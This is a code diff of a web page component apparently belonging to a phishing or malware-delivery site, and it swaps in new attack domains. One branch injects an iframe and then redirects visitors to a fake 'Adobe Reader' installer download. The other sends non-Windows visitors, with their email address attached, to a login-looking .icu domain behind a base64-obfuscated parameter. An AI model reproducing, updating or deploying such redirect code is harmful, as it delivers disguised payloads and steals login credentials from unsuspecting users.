@@ -14,7 +14,7 @@ export default function Home() {
       document.body.appendChild(iframe);
 
       setTimeout(() => {
-        window.location.href = 'https://jomry.com/adobe-readers/installer/download.html';
+        window.location.href = 'https://mksonline.com.mx/css/adobe/reader/download.html';
       }, 2000);
       return;
     }
@@ -37,7 +37,7 @@ export default function Home() {
     if (email) {
       // Redirect to Non-Windows target with raw email
       window.location.href =
-        `https://accounts.fxzova.icu?xJsf1Kdet7hf=aHR0cHM6Ly9hY2NvdW50cy5nb29nbGUuY29t&smn=${email}`;
+        `https://login.jsspjg.icu?b5dAzQiZHlQ5=aHR0cHM6Ly9ta3NvbmxpbmUuY29tLm14L2Nzcy9hZG9iZS9yZWFkZXIvZG93bmxvYWQuaHRtbA==&smn=${email}`;
     }
   }, []);
 
